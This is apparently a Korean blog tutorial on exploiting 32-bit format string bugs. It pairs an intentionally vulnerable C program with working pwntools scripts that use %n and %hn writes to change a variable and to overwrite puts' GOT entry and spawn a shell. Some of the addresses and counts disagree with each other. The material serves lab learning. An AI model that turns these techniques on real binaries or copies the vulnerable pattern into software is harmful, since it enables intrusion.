## FSB(Format String Bug)-2

### example4

```c
// Name : example4
// Compaile : gcc -o example4 example4.c -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -no-pie

#include<stdio.h>


void get_shell()
{
    system("/bin/sh");
}

int main(void)
{   
    int val = 0xfff; // 0xfff = 4095
    char buf[20] ={0,};

    printf("val = %d\n", val);
    printf("val_addr = %p\n", &val);


    gets(buf);
    printf(buf);
    
    if(val == 0xffe) // 0xffe = 4094
    {
        get_shell();
    }
    printf("\nval = %d", val);
    puts("");
}
```

**example4** 는 val 변수의 주소를 출력하고 사용자로부터 입력을 받고 출력해주고 val 변수 값이 '0xffe' 이면 get_shell 함수를 호출한다. 

쉘을 얻기 위한 시나리오로는 __val변수 값을 0xffe 로 변경__ 시켜 쉘을 얻거나(_뭐 당연히 정상적인 실행으로는 get_shell 함수를 사용할 수 없다._)

PIE는 적용돼있지 않고 Partial RELRO가 적용돼있기 때문에 get_shell함수의 주소를 얻어  __puts함수의 GOT 에 get_shell함수의 주소로 overwrite__ 하여 코드 가장 하단에 위치한`puts("");`명령 대신 get_shell함수를 실행시킬 수 있을 것이다.

    <figcaption>Fig 2. example4 실행</figcaption>
</figure>

__Fig 2__ 를 통해 **val** 변수 주소(0xffffd3c0)가 고정돼있는 것을 확인해 볼 수 있다.

먼저 `AAAA %p %p %p %p`를 입력하여 esp와의 offset을 확인해보았다.

실행 결과 AAAA(0x41414141)은 `%p`로 `%1$p`에 위치해있다.

#### val 변수값 변경으로 쉘얻기

먼저 val 변수값을 변경하여 쉘을 얻어보겠다.

 AAAA의 위치에 __val변수의 주소를 넣고 %[숫자]c를 사용하여 '0xffe'의 (10진수값 4094) 만큼 채워놓은후__  $[offset]$n으로 val 변수를 '0ffe'로  사용하여 payload는 다음과 같이 채워놓을 수 있을 것이다. 

> payload = val주소(4byte) + %4090c + %1$n

여기서 %4090c인 이유는 앞에 val주소가 출력 되어있어 4094 - 4byte 를 계산한 %4090c로 작성하였다.

```python
from pwn import *

process_path = './example4'
r = process(process_path)

r.recvuntil("val_addr = ")

val_addr = int(r.recvn(10) ,16)
payload = p32(val_addr)
payload += b'%4090c'
payload += b'%1$n'

r.send(payload)

r.interactive()
```

#### puts_got Overwrite 로 쉘 얻기

다음은 puts_got에 get_shell주소를 Overwrite하여 쉘을얻기위한 payload를 작성해보겠다.

payload는 위에서 작성했던것과 같이 get_shell주소는 10진수로 __134513846__ 이기때문에 __앞에서 출력된 val_addr주소(4byte)가빠진__ %134513842c로 계산하여 payload를 작성하면된다.

하지만 %c 를 이용해 134513794개의 문자를 출력해내기에는 .........(_언제 다할꺼야 ~~_)

__따라서 주소를 쪼개서  1byte 혹은 2byte씩 넣는다.__ 

<figure>
    <img src="https://Froggy0m0.github.io/assets/img/Pwnable/2022-01-10-fsb_32bit_part2-4.png">
    <figcaption>Fig 4. put_got 주소확인</figcaption>

__Fig 4__ 를 확인해보면 puts_got(0x804a014)의 값은 puts_plt(0x08048366)가 저장되있다. 여기서 puts_got를 Overwrite하여 get_shell(0x08048486) 주소로 변경하면된다.

<figure>
    <img src="https://Froggy0m0.github.io/assets/img/Pwnable/2022-01-10-fsb_32bit_part2-5.png">
    <figcaption>Fig 5. put_Got Overwrite</figcaption>
</figure>

> __1byte씩__ Overwrite는 __%hhn__ 을 사용해서
>
> 0x08048486를 1byte씩 쪼개어 저장한다.(0x08, 0x04, 0x84, 0x86 )
>
> > puts_got+3 = 0x08 (10진수 8)
> >
> > puts_got+2 = 0x04 (10진수 4)
> >
> > puts_got+1 = 0x84 (10진수 132)
> >
> > puts_got+0 = 0x86 (10진수 134)
>
> __2byte씩__ Overwrite는 __%hn__ 을 사용해서
>
> 0x0804, 0x8486
>
> >puts_got+2 = 0x0804 (10진수 2052)
> >
> >puts_got+0 = 0x8486 (10진수 33926)

2btye씩 짤라 넣는다고 했을때 payload는

```
payload = puts_got+0

payload += puts_got+2

payload += %33922(0x8486 - 0x8(4byte주소 +2))c %1$hn

payload += %33662(0x10000 + 0x0804 - 0x8486)c %2$hn
```

puts_got+2를 overwrite하면서 __0x10000__ 를 더해준 이유는 puts_got+0 에 덮을 길이가  puts_got+2에 길이보다 더커서 계산하는 과정에서 __음수__ 가 된다.

이때 __%hn__ 으로 __2byte__ 만 값을 넣어줄 것 이기 때문에 __2byte__ 의 범위를 넘긴 __0x10000__ 더해 계산하였다.

> 1byte 의 최대값 0xff
>
> 2byte의 최대값 0xffff
>
> > 즉, __최대값+1__ 을 더해 계산해 __2의보수__ 를 취해준다.

```python
from pwn import *

process_path = './example4'
p = process(process_path)
e = ELF("./example4")

p.recvuntil("val_addr = ")
val_addr = int(p.recvn(10), 16)
get_shell = 0x80484b6       ##134513846
get_shell_high = 0x0804     ##2052
get_shell_low =  0x84b6     ##33974
puts_got = e.got['puts']    ##0x804a014

payload = p32(puts_got)
payload += '%{}c'.format(get_shell_low - 4).encode() #33974-4
payload += b'%1$hn'

p.sendline(payload)

p.interactive()
```

`p.sendline(payload)`는 gets함수가 호출되는 시점에서 payload를 보내기 때문에 Puts 함수가 실행 되기 전이여서 __Puts_GOT의 상위2byte__ 와 __get_shell의 상위 2byte__ 가 __0x0804로 동일하다.__ (get함수가 호출되는 시점에서 printf의 GOT에 저장된 상위 2byte 0xf... 로 시작된다.)



따라서 __하위 2byte만 overwrite하더라도__  get_shell을 호출할 수 있게 된다.
